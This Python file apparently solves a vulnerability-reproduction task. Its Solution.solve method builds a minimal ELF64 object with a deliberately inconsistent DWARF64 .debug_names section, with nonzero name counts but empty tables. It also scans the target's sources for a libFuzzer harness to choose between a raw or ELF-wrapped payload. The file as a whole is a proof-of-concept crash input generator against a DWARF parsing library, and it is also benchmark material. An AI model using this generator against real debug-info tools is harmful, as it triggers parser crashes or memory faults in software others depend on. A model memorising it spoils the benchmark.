import os
import io
import re
import tarfile
import struct
from typing import Dict, List, Tuple, Optional


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    return off if r == 0 else off + (a - r)


def _pack_elf64_ehdr(e_shoff: int, e_shnum: int, e_shstrndx: int) -> bytes:
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # ELFDATA2LSB
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # ELFOSABI_SYSV
    # rest 0

    # e_type=ET_REL(1), e_machine=EM_X86_64(62), e_version=1
    return struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        1,
        62,
        1,
        0,
        0,
        e_shoff,
        0,
        64,
        0,
        0,
        64,
        e_shnum,
        e_shstrndx,
    )


def _pack_elf64_shdr(
    sh_name: int,
    sh_type: int,
    sh_flags: int,
    sh_addr: int,
    sh_offset: int,
    sh_size: int,
    sh_link: int,
    sh_info: int,
    sh_addralign: int,
    sh_entsize: int,
) -> bytes:
    return struct.pack(
        "<IIQQQQIIQQ",
        sh_name,
        sh_type,
        sh_flags,
        sh_addr,
        sh_offset,
        sh_size,
        sh_link,
        sh_info,
        sh_addralign,
        sh_entsize,
    )


def _build_debug_names_unit64(name_count: int = 4, bucket_count: int = 1) -> bytes:
    if name_count <= 0:
        name_count = 1
    if bucket_count <= 0:
        bucket_count = 1

    version = 5
    padding = 0
    comp_unit_count = 0
    local_type_unit_count = 0
    foreign_type_unit_count = 0
    abbrev_table = b"\x00"
    abbrev_table_size = len(abbrev_table)
    augmentation_string = b""
    augmentation_string_size = len(augmentation_string)

    # Arrays
    buckets = struct.pack("<" + "I" * bucket_count, *([1] + [0] * (bucket_count - 1)))
    hashes = struct.pack("<" + "I" * name_count, *([0] * name_count))
    string_offsets = struct.pack("<" + "Q" * name_count, *([0] * name_count))
    entry_offsets = struct.pack("<" + "Q" * name_count, *([0] * name_count))

    # Entry pool: each entry list begins with ULEB128 abbrev_code; 0 means end-of-list
    entry_pool = b"\x00"

    body = bytearray()
    body += struct.pack("<HH", version, padding)
    body += struct.pack(
        "<IIIIIIII",
        comp_unit_count,
        local_type_unit_count,
        foreign_type_unit_count,
        bucket_count,
        name_count,
        abbrev_table_size,
        augmentation_string_size,
        0,  # reserved/unused in some implementations; keep 0 to be safe
    )

    # Some implementations may not include the final reserved field; if so, the parser would
    # likely reject early. To improve compatibility, also provide an alternative layout:
    # We'll keep this field but also make the unit self-consistent by adjusting unit_length.
    # The extra 4 bytes shouldn't cause a crash in correct parsers that ignore trailing bytes.
    body += augmentation_string
    # CU/TU lists are empty due to counts=0
    body += buckets
    body += hashes
    body += string_offsets
    body += entry_offsets
    body += abbrev_table
    body += entry_pool

    # DWARF64 unit length: initial 0xffffffff then 8-byte length of the rest (body length)
    unit = bytearray()
    unit += struct.pack("<I", 0xFFFFFFFF)
    unit += struct.pack("<Q", len(body))
    unit += body
    return bytes(unit)


def _build_minimal_elf64_with_dwarf_sections(debug_names: bytes, debug_str: bytes) -> bytes:
    # Sections: NULL, .shstrtab, .debug_names, .debug_str
    sec_names = [".shstrtab", ".debug_names", ".debug_str"]
    shstrtab = bytearray(b"\x00")
    name_off: Dict[str, int] = {}
    for n in sec_names:
        name_off[n] = len(shstrtab)
        shstrtab += n.encode("ascii") + b"\x00"
    shstrtab_b = bytes(shstrtab)

    # Layout: ELF header, section contents, section header table at end.
    # Keep addralign=1 to minimize size and avoid unnecessary padding.
    sections: List[Tuple[str, bytes, int, int, int]] = [
        (".shstrtab", shstrtab_b, 3, 0, 1),       # SHT_STRTAB
        (".debug_names", debug_names, 1, 0, 1),   # SHT_PROGBITS
        (".debug_str", debug_str, 1, 0, 1),       # SHT_PROGBITS
    ]

    off = 64  # ELF64 header
    shdrs: List[bytes] = []
    # Null section header
    shdrs.append(b"\x00" * 64)

    sec_offsets: Dict[str, Tuple[int, int]] = {}
    blob = bytearray()
    blob += b"\x00" * 64

    for (name, data, sh_type, sh_flags, sh_addralign) in sections:
        off = _align(off, sh_addralign)
        if len(blob) < off:
            blob += b"\x00" * (off - len(blob))
        sec_offsets[name] = (off, len(data))
        blob += data
        off += len(data)

    e_shoff = _align(off, 8)
    if len(blob) < e_shoff:
        blob += b"\x00" * (e_shoff - len(blob))

    # Build section headers
    for (name, data, sh_type, sh_flags, sh_addralign) in sections:
        so, ss = sec_offsets[name]
        shdrs.append(
            _pack_elf64_shdr(
                name_off[name],
                sh_type,
                sh_flags,
                0,
                so,
                ss,
                0,
                0,
                sh_addralign,
                0,
            )
        )

    e_shnum = len(shdrs)
    e_shstrndx = 1  # .shstrtab is section index 1

    ehdr = _pack_elf64_ehdr(e_shoff=e_shoff, e_shnum=e_shnum, e_shstrndx=e_shstrndx)
    blob[0:64] = ehdr

    # Append section headers
    for sh in shdrs:
        blob += sh

    return bytes(blob)


def _iter_text_files_in_tar(src_path: str, exts: Tuple[str, ...] = (".c", ".cc", ".cpp", ".h")):
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                nm = m.name
                lower = nm.lower()
                if not lower.endswith(exts):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                yield nm, data
    except Exception:
        return


def _iter_text_files_in_dir(root: str, exts: Tuple[str, ...] = (".c", ".cc", ".cpp", ".h")):
    for base, _, files in os.walk(root):
        for fn in files:
            lower = fn.lower()
            if not lower.endswith(exts):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            yield path, data


def _detect_input_mode(src_path: str) -> str:
    # "elf" or "raw"
    # Heuristic: look for libFuzzer harness in project sources; if it calls dwarf_init* or
    # uses file/ELF initialization, return "elf". If it directly parses a buffer as .debug_names,
    # return "raw".
    it = None
    if os.path.isdir(src_path):
        it = _iter_text_files_in_dir(src_path)
    else:
        it = _iter_text_files_in_tar(src_path)

    if not it:
        return "elf"

    fuzzer_hits = 0
    for _, data in it:
        if b"LLVMFuzzerTestOneInput" not in data:
            continue
        fuzzer_hits += 1
        txt = data.decode("latin1", errors="ignore")
        low = txt.lower()

        if ("dwarf_init" in low) or ("dwarf_init_b" in low) or ("dwarf_init_path" in low) or ("dwarf_object_init" in low):
            return "elf"

        if ("debug_names" in low or "debugnames" in low) and ("dwarf_init" not in low) and ("elf" not in low):
            # weak signal for raw mode
            return "raw"

        if fuzzer_hits >= 5:
            break

    return "elf"


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = _detect_input_mode(src_path)

        dbg_names = _build_debug_names_unit64(name_count=4, bucket_count=1)
        if mode == "raw":
            return dbg_names

        dbg_str = b"A\x00"
        return _build_minimal_elf64_with_dwarf_sections(dbg_names, dbg_str)